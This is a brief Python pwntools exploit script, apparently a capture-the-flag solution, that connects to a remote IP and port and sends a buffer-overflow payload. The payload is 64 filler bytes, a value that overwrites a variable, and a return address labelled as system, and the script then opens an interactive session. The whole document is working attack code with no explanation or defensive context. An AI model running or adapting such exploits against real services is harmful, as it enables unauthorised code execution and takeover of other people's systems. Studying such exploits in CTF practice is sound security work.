from pwn import *

io = remote('165.22.107.94', 17002)

offset = 64
desired_value = p32(0x4170417)
system_addr = p64(0x401050)

payload = b'A' * offset + desired_value + b'A' * 4 + system_addr

io.sendline(payload)
io.interactive()
